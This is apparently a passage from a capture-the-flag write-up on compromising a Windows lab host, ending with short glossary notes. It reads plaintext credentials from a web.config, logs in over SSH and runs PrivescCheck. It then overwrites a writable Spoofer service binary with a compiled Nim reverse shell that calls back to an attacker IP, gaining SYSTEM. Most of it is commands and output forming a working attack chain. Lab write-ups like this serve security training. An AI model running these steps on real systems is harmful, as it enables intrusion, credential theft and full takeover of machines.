    </system.applicationHost>

    <system.webServer>

        <asp />

        <caching enabled="true" enableKernelCache="true">
        </caching>

        <cgi />

        <defaultDocument enabled="true">
            <files>
                <add value="Default.htm" />
                <add value="Default.asp" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>

        <directoryBrowse enabled="false" />

        <fastCgi />

        <!--

          The <globalModules> section defines all native-code modules.
          To enable a module, specify it in the <modules> section.

        -->
        <globalModules>
            <add name="HttpLoggingModule" image="%windir%\System32\inetsrv\loghttp.dll" />
            <add name="UriCacheModule" image="%windir%\System32\inetsrv\cachuri.dll" />
            <add name="FileCacheModule" image="%windir%\System32\inetsrv\cachfile.dll" />
            <add name="TokenCacheModule" image="%windir%\System32\inetsrv\cachtokn.dll" />
            <add name="HttpCacheModule" image="%windir%\System32\inetsrv\cachhttp.dll" />
            <add name="StaticCompressionModule" image="%windir%\System32\inetsrv\compstat.dll" />
            <add name="DefaultDocumentModule" image="%windir%\System32\inetsrv\defdoc.dll" />
            <add name="DirectoryListingModule" image="%windir%\System32\inetsrv\dirlist.dll" />
            <add name="ProtocolSupportModule" image="%windir%\System32\inetsrv\protsup.dll" />
            <add name="StaticFileModule" image="%windir%\System32\inetsrv\static.dll" />
            <add name="AnonymousAuthenticationModule" image="%windir%\System32\inetsrv\authanon.dll" />
            <add name="RequestFilteringModule" image="%windir%\System32\inetsrv\modrqflt.dll" />
            <add name="CustomErrorModule" image="%windir%\System32\inetsrv\custerr.dll" />
        </globalModules>

 [REDACTED] - MORE

        <httpLogging dontLog="false" />

 [REDACTED] - MORE

        <httpRedirect />

        <httpTracing />

        <isapiFilters />

        <modules>
            <add name="HttpLoggingModule" lockItem="true" />
            <add name="HttpCacheModule" lockItem="true" />
            <add name="StaticCompressionModule" lockItem="true" />
            <add name="DefaultDocumentModule" lockItem="true" />
            <add name="DirectoryListingModule" lockItem="true" />
            <add name="ProtocolSupportModule" lockItem="true" />
            <add name="StaticFileModule" lockItem="true" />
            <add name="AnonymousAuthenticationModule" lockItem="true" />
            <add name="RequestFilteringModule" lockItem="true" />
            <add name="CustomErrorModule" lockItem="true" />
        </modules>

        <odbcLogging />

        <security>

            <access sslFlags="None" />

            <applicationDependencies />

            <authentication>

                <anonymousAuthentication enabled="true" userName="IUSR" />

 [REDACTED] - MORE

            <requestFiltering>
                <fileExtensions allowUnlisted="true" applyToWebDAV="true" />
                <verbs allowUnlisted="true" applyToWebDAV="true" />
                <hiddenSegments applyToWebDAV="true">
                    <add segment="web.config" />
                </hiddenSegments>
            </requestFiltering>

        </security>

        <serverRuntime />

        <serverSideInclude />
        

    [REDACTED] - MORE
    

        <tracing>

            <traceFailedRequests />

            <traceProviderDefinitions />

        </tracing>

        <urlCompression />

        <validation />

    </system.webServer>
    <system.ftpServer>
        <providerDefinitions>
            <add name="IisManagerAuth" type="Microsoft.Web.FtpServer.Security.IisManagerAuthenticationProvider,Microsoft.Web.FtpServer,version=7.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
            <add name="AspNetAuth" type="Microsoft.Web.FtpServer.Security.AspNetFtpMembershipProvider,Microsoft.Web.FtpServer,version=7.5.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
        </providerDefinitions>
        <log>
        </log>
        <firewallSupport />
        <caching>
        </caching>
        <security>
            <ipSecurity />
            <requestFiltering>
                <hiddenSegments>
                    <add segment="_vti_bin" />
                </hiddenSegments>
            </requestFiltering>
            <authorization>
                <add accessType="Allow" users="?" permissions="Read" />
                <add accessType="Allow" users="*" permissions="Read" />
            </authorization>
        </security>
    </system.ftpServer>
    <location path="data-leaks">
        <system.ftpServer>
            <security>
                <authorization>
                    <add accessType="Allow" users="*" permissions="Read, Write" />
                    <add accessType="Allow" users="?" permissions="Read, Write" />
                </authorization>
            </security>
        </system.ftpServer>
    </location>

</configuration>

file > /inetpub/wwwroot/hacksmartersec/web.config
Reading contents of /inetpub/wwwroot/hacksmartersec/web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>

file > 
```

> **SSH Connection Phase**
> 

`ssh -o MACs=hmac-sha2-256 tyler@hacksmartersec`

```bash
password: IAmA1337h4x0randIkn0wit!

tyler@HACKSMARTERSEC C:\Users\tyler> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

tyler@HACKSMARTERSEC C:\Users\tyler> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192

tyler@HACKSMARTERSEC C:\Users\tyler> systeminfo
ERROR: Access denied

tyler@HACKSMARTERSEC C:\Users\tyler>

```

> **File Enumeration & Privilege Search Phase**
> 

```bash
tyler@HACKSMARTERSEC C:\Users\tyler> wmic product get name, version
ERROR:
Description = Access denied

tyler@HACKSMARTERSEC C:\Users\tyler> 

```

`wget https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1 -O priv.ps1`

```bash
priv.ps1                             100%[====================================================================>] 178.07K  1.10MB/s    in 0.2s    

2024-10-22 06:12:45 (1.10 MB/s) - 'priv.ps1' saved [182339/182339]

```

**For script source:**

[https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1)

`python3 -m http.server 8000`

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
tyler@HACKSMARTERSEC C:\Users\tyler> curl http://10.2.37.37:8000/priv.ps1 -o priv.ps1
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  178k  100  178k    0     0  91169      0  0:00:02  0:00:02 --:--:-- 88428

tyler@HACKSMARTERSEC C:\Users\tyler>dir 
 Volume in drive C has no label. 
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\tyler

10/22/2024  10:12 AM    <DIR>          .
10/22/2024  10:12 AM    <DIR>          ..
06/30/2023  07:10 PM    <DIR>          3D Objects
06/30/2023  07:10 PM    <DIR>          Contacts
06/30/2023  07:12 PM    <DIR>          Desktop
06/30/2023  07:10 PM    <DIR>          Documents
06/30/2023  07:10 PM    <DIR>          Downloads
06/30/2023  07:10 PM    <DIR>          Favorites
06/30/2023  07:10 PM    <DIR>          Links
06/30/2023  07:10 PM    <DIR>          Music
06/30/2023  07:10 PM    <DIR>          Pictures
10/22/2024  10:12 AM           182,339 priv.ps1
06/30/2023  07:10 PM    <DIR>          Saved Games
06/30/2023  07:10 PM    <DIR>          Searches
06/30/2023  07:10 PM    <DIR>          Videos
               1 File(s)        182,339 bytes
              14 Dir(s)  14,106,624,000 bytes free
              
tyler@HACKSMARTERSEC C:\Users\tyler> copy priv.ps1 C:\Windows\Temp 
        1 file(s) copied. 

tyler@HACKSMARTERSEC C:\Users\tyler> sc query WinDefend

SERVICE_NAME: WinDefend 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Users\tyler> cd C:\Windows\Temp
tyler@HACKSMARTERSEC C:\Windows\Temp> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\Temp> . .\priv.ps1; Invoke-PrivescCheck -Extended

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃ 
┃ NAME     ┃ User identity                                     ┃ 
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫ 
┃ Get information about the current user (name, domain name)   ┃ 
┃ and its access token (SID, integrity level, authentication   ┃ 
┃ ID).                                                         ┃ 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
[*] Status: Informational                                       
                                                                
                                                                
Name             : HACKSMARTERSEC\tyler                         
SID              : S-1-5-21-1966530601-3185510712-10604624-1008 
IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)         
SessionId        : 0                                            
TokenId          : 00000000-001f3f8d
AuthenticationId : 00000000-001f3725
OriginId         : 00000000-000003e7
ModifiedId       : 00000000-001f373b
Source           : Advapi (00000000-001f370f)

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
┃ NAME     ┃ User groups                                       ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Get information about the groups the current user belongs to ┃
┃ (name, type, SID).                                           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Informational 

Name                                   Type           SID
----                                   ----           ---
HACKSMARTERSEC\None                    Group          S-1-5-21-1966530601-3185510712-10604624-513
Everyone                               WellKnownGroup S-1-1-0
BUILTIN\Users                          Alias          S-1-5-32-545
NT AUTHORITY\NETWORK                   WellKnownGroup S-1-5-2
NT AUTHORITY\Authenticated Users       WellKnownGroup S-1-5-11
NT AUTHORITY\This Organization         WellKnownGroup S-1-5-15
NT AUTHORITY\Local account             WellKnownGroup S-1-5-113
NT AUTHORITY\LogonSessionId_0_2045732  LogonSession   S-1-5-5-0-2045732
NT AUTHORITY\NTLM Authentication       WellKnownGroup S-1-5-64-10
Mandatory Label\Medium Mandatory Level Label          S-1-16-8192

[REDACTED] - MORE

Name        : spoofer-scheduler
DisplayName : Spoofer Scheduler
ImagePath   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
User        : LocalSystem
StartMode   : Automatic

[REDACTED] - MORE

┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Service image file permissions                    ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service's binary or its folder.                            ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
[*] Status: Vulnerable - High 

Name              : spoofer-scheduler
ImagePath         : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
User              : LocalSystem
ModifiablePath    : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
IdentityReference : BUILTIN\Users
Permissions       : WriteOwner, Delete, WriteAttributes, Synchronize, ReadControl, ReadData, AppendData, WriteExtendedAttributes, WriteDAC,       
                    ReadAttributes, WriteData, ReadExtendedAttributes, DeleteChild, Execute
Status            : Running
UserCanStart      : True
UserCanStop       : True

[REDACTED] - MORE

PS C:\Windows\Temp> cmd
tyler@HACKSMARTERSEC C:\Windows\Temp>cd C:\Program Files (x86)\Spoofer 

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>dir 
 Volume in drive C has no label.                    
 Volume Serial Number is A8A4-C362                  
                                                    
 Directory of C:\Program Files (x86)\Spoofer        
                                                    
06/30/2023  06:57 PM    <DIR>          .            
06/30/2023  06:57 PM    <DIR>          ..           
07/24/2020  09:31 PM            16,772 CHANGES.txt  
07/16/2020  07:23 PM             7,537 firewall.vbs 
07/24/2020  09:31 PM            82,272 LICENSE.txt  
07/24/2020  09:31 PM             3,097 README.txt   
07/24/2020  09:31 PM            48,776 restore.exe  
07/20/2020  11:12 PM           575,488 scamper.exe  
06/30/2023  06:57 PM               152 shortcuts.ini
07/24/2020  09:31 PM         4,315,064 spoofer-cli.exe
07/24/2020  09:31 PM        16,171,448 spoofer-gui.exe
07/24/2020  09:31 PM         4,064,696 spoofer-prober.exe
07/24/2020  09:31 PM         8,307,640 spoofer-scheduler.exe
07/24/2020  09:31 PM               667 THANKS.txt
07/24/2020  09:31 PM           217,416 uninstall.exe
              13 File(s)     33,811,025 bytes
               2 Dir(s)  14,104,354,816 bytes free 
               
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> type CHANGES.txt 
spoofer-1.4.6 (2020-07-24) 
-------------
* Finds Spoofer control server by hostname instead of IP address
* Updated for better compatibility with Qt 5.15
* Updated for better compatibility with protobuf 3.12
* macOS: avoid use of launch services API (deprecated in OS X 10.10)
* macOS: updated binary release:
  - drop support for OS X <10.10
  - updated bundled third-party packages: openssl 1.1.1g, pcap 1.9.1,
    protobuf 3.12.3, Qt 5.9, scamper 20200717
* Windows: updated binary release:
  - updated bundled third-party packages: openssl 1.1.1g, protobuf 3.9.0,
    Qt 5.15, scamper 20200717
* Added new CA bundle to match potential new server SSL certificate
* Fix build error on FreeBSD 13+ and other platforms with arc4random() but not
  arc4random_stir() (OpenBSD was already fixed in Spoofer 1.4.2)
  
[REDACTED] - MORE

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer>
```

> **Privilege Escalation with Spoofer Scheduler Service**
> 

**For more information:**

[Spoofer 1.4.6 Privilege Escalation / Unquoted Service Path ≈ Packet Storm](https://packetstormsecurity.com/files/166553/Spoofer-1.4.6-Privilege-Escalation-Unquoted-Service-Path.html)

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> sc qc spoofer-scheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: spoofer-scheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\Spoofer\spoofer-scheduler.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Spoofer Scheduler
        DEPENDENCIES       : tcpip
        SERVICE_START_NAME : LocalSystem

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> sc sdshow spoofer-scheduler

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPLORC;;;S-1-5-21-196653
0601-3185510712-10604624-1008)

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> 

```

`wget https://raw.githubusercontent.com/Sn1r/Nim-Reverse-Shell/refs/heads/main/rev_shell.nim`

```bash
rev_shell.nim                        100%[====================================================================>]     823  --.-KB/s    in 0.04s   

2024-10-22 06:40:03 (18.1 KB/s) - 'rev_shell.nim' saved [823/823]

```

**For script source:**

[https://github.com/Sn1r/Nim-Reverse-Shell/blob/main/rev_shell.nim](https://github.com/Sn1r/Nim-Reverse-Shell/blob/main/rev_shell.nim)

`nano rev_shell.nim`

```bash
[REDACTED] - MORE

  v = newSocket()

  # Change this
  v1 = "10.2.37.37"
  v2 = "80"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"
  
[REDACTED] - MORE
```

`nc -nvlp 80`

```bash
listening on [any] 80 ...
```

**For installing Nim:**

[How To Install Nim Programming Language In Linux - OSTechNix](https://ostechnix.com/how-to-install-nim-programming-language-on-linux/)

`nim c -d:mingw --app:gui rev_shell.nim`

```bash
[REDACTED] - MORE

Hint:  [Link]
Hint: mm: orc; threads: on; opt: none (DEBUG BUILD, `-d:release` generates faster code)
61409 lines; 2.261s; 91.613MiB peakmem; proj: /root/Desktop/CyberLearningFramework/hacksmartersecurity/rev_shell.nim; out: /root/Desktop/CyberLearningFramework/hacksmartersecurity/rev_shell.exe
```

`cp rev_shell.exe spoofer-scheduler.exe`

```bash
tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> sc stop spoofer-scheduler
SERVICE_NAME: spoofer-scheduler 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> sc query spoofer-scheduler

SERVICE_NAME: spoofer-scheduler 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> curl http://10.2.37.37:8000/spoofer-scheduler.exe -o spoofer-scheduler.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  485k  100  485k    0     0   242k      0  0:00:02  0:00:02 --:--:--  199k

tyler@HACKSMARTERSEC C:\Program Files (x86)\Spoofer> sc start spoofer-scheduler

```

```bash
listening on [any] 80 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.232.134] 49909
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> 

```

# Appendix

## Dell OpenManage Server Administrator (OMSA)

<aside>
💡

Dell OpenManage Server Administrator (OMSA) is a comprehensive management software developed by Dell for monitoring, managing, and troubleshooting Dell servers. It provides system administrators with in-depth hardware management capabilities to maintain the health and functionality of their Dell PowerEdge servers. It offers both a graphical user interface (GUI) and command-line interface (CLI) for managing hardware components and system health directly.

</aside>

## File Disclosure

<aside>
💡

File Disclosure (also known as File Disclosure Vulnerability or File Inclusion Vulnerability) is a type of security flaw where an attacker can gain unauthorized access to files on a server. This typically happens due to improper handling of user input, especially when file paths are provided by the user and not properly validated or sanitized. File disclosure vulnerabilities can lead to severe consequences, such as revealing sensitive system files, user data, or configuration files that contain critical information like passwords or API keys.

</aside>

## Spoofer

<aside>
💡

The term "spoofer-scheduler" refers to a service associated with the Spoofer tool, specifically the version 1.4.6. This service, called spoofer-scheduler, is often found running as a scheduled service on a system, typically with elevated privileges like LocalSystem. In certain cases, vulnerabilities in the spoofer-scheduler (such as an unquoted service path) can be exploited to gain elevated access or control over the system, allowing attackers to replace legitimate binaries with malicious ones.

</aside>

## Nim Programming Language

<aside>
💡

**Nim** is a statically-typed, compiled programming language that emphasizes performance, readability, and ease of use. It is designed to be both expressive and efficient, combining the best features of languages like C, Python, and Lisp, making it ideal for systems programming, web development, and applications requiring high performance.

</aside>